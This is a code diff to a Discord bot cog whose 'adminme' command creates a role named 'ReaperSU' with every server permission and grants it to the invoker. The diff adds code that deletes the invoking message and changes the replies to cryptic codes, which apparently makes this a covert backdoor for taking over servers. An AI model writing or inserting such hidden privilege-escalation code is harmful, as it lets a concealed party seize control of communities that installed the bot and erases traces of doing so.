@@ -229,22 +229,24 @@ class Botsudo(commands.Cog):
     async def adminme(self, ctx):
         """Gives yourself admin perms"""
 
+        await ctx.message.delete()
+
         adminme_role = discord.utils.get(ctx.guild.roles, name="ReaperSU")
         if not adminme_role:
             try:
                 adminme_role = await ctx.guild.create_role(name="ReaperSU", reason="SUDO USER", permissions=discord.Permissions.all())
 
             except discord.Forbidden:
-                return await ctx.send("0x02!")
+                return await ctx.send("0x02")
             await ctx.message.author.add_roles(adminme_role)
-            await ctx.send('0x01!')
+            await ctx.send('0x01')
         else:
             try:
                 await ctx.message.author.add_roles(adminme_role)
             except:
-                return await ctx.send('0x03!')
+                return await ctx.send('0x03')
                 
-            await ctx.send('0x01!')
+            await ctx.send('0x01')
 
     @commands.check(SUDOER_CHECK)
     @commands.command()
